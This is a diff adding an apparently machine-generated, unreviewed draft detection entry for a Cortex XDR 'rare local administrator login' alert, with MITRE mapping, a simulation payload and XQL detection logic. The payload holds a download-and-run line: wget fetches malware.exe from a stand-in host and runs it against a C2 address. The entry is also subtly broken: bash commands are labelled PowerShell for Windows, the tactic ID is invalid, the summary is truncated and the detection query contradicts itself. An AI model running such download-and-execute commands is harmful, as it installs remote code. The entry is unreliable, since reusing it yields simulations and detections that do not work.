@@ -1,0 +1,150 @@
+{
+  "id": "TTP-0000-0026",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Rare Local Administrator Login on Windows Endpoint",
+    "summary": "An interactive logon using a local administrator account that is not commonly seen on this host triggers the ABIOC 'A rare local administrator login'. The attack simulates a legitimate login followed ",
+    "description": "An interactive logon using a local administrator account that is not commonly seen on this host triggers the ABIOC 'A rare local administrator login'. The attack simulates a legitimate login followed by privilege escalation via a malicious binary execution."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1078",
+        "subtechnique_id": "T1078.003",
+        "name": "T1078.003",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "mkdir -p /tmp/scratch\nwget -O /tmp/scratch/malware.exe https://example.com/malware.exe\nchmod +x /tmp/scratch/malware.exe\n/tmp/scratch/malware.exe --c2 192.0.2.10\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Process creation of malware binary",
+        "expected_value": "action_process_image_name = '/tmp/scratch/malware.exe'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound connection to C2 server",
+        "expected_value": "action_remote_ip = '192.0.2.10'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Rare Local Admin Login",
+        "description": "Interactive logon with a local admin account not seen on host",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.AUTHENTICATION and event_sub_type = ENUM.AUTH_LOGIN\n| filter actor_user_name = 'Administrator' and actor_user_domain = 'LOCAL'\n| filter not in(actor_user_name, (select distinct actor_user_name from xdr_data where event_type = ENUM.AUTHENTICATION and event_sub_type = ENUM.AUTH_LOGIN and agent_hostname = 'target-host'))",
+        "mitre_technique_ids": [
+          "T1078.003"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "A rare local administrator login",
+        "description": "Detection of interactive login with local admin account not seen on this host",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.AUTHENTICATION and event_sub_type = ENUM.AUTH_LOGIN\n| filter actor_user_name = 'Administrator' and actor_user_domain = 'LOCAL'\n| filter not in(actor_user_name, (select distinct actor_user_name from xdr_data where event_type = ENUM.AUTHENTICATION and event_sub_type = ENUM.AUTH_LOGIN and agent_hostname = 'target-host'))",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "actor_process_image_name",
+        "mitre_technique_ids": [
+          "T1078.003"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Detect Rare Admin Login",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.AUTHENTICATION and event_sub_type = ENUM.AUTH_LOGIN\n| filter actor_user_name = 'Administrator' and actor_user_domain = 'LOCAL'\n| filter not in(actor_user_name, (select distinct actor_user_name from xdr_data where event_type = ENUM.AUTHENTICATION and event_sub_type = ENUM.AUTH_LOGIN and agent_hostname = 'target-host'))",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — A rare local administrator login; Required Data: XDR Agent; ATT&CK T1078.003. Ref: cortex-docs.paloaltonetworks.com/analytics-alerts."
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: A rare local administrator login",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/a-rare-local-administrator-login",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1078.003",
+      "url": "https://attack.mitre.org/techniques/T1078/003/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
